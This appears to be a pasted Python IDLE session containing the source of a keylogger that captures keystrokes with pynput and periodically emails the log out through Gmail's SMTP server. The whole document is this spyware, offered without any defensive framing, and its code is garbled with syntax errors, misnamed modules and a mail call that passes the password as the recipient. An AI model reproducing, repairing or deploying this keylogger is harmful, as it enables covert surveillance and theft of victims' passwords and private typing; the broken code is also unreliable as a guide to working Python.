Python 3.8.0 (tags/v3.8.0:fa919fd, Oct 14 2019, 19:21:23) [MSC v.1916 32 bit (Intel)] on win32
Type "help", "copyright", "credits" or "license()" for more information.
>>> 
import pynput.Keyboard
import threading
import smtplib

class Keylogger:
    def_init_(self,time_interval,email,password):
        self.log= " "
        self.interval= time_interval
        self.email= email
        self.password= password
        
    def append_to_log(self,string):
        self.log= self.log + string
        
    def process_Key_press(self,Key):
        try:
            current_Key= str(Key.char)
        except Attribute Error:
            if Key== Key.space:
                current_Key= " "
            else:
                current_Key= " "+str(Key)+ " "
            self.append_to_log( current_Key)
    
    def report(self):
        self.Send_mail(self.email, self.password, "\n\n"+ self.log)
        self.log= " "
        timer= threading.Timer(self.interval,self.report)
        timer.start()
        
    def Send_mail(self,email,password,message):
        server = smtplib.SMTP("smtp.gmail.com",587)
        server.starttls()
        server.login(email,password)
        server.Sendmail(email,password,message)
        server.quit()
        
    def start(self):
        Keyboard_listener = pynput.Keyboard
        Listener (on press = self.process_Key_press)
        with Keyboard_listener:
            self.report()
            Keyboard_listener.join()
            

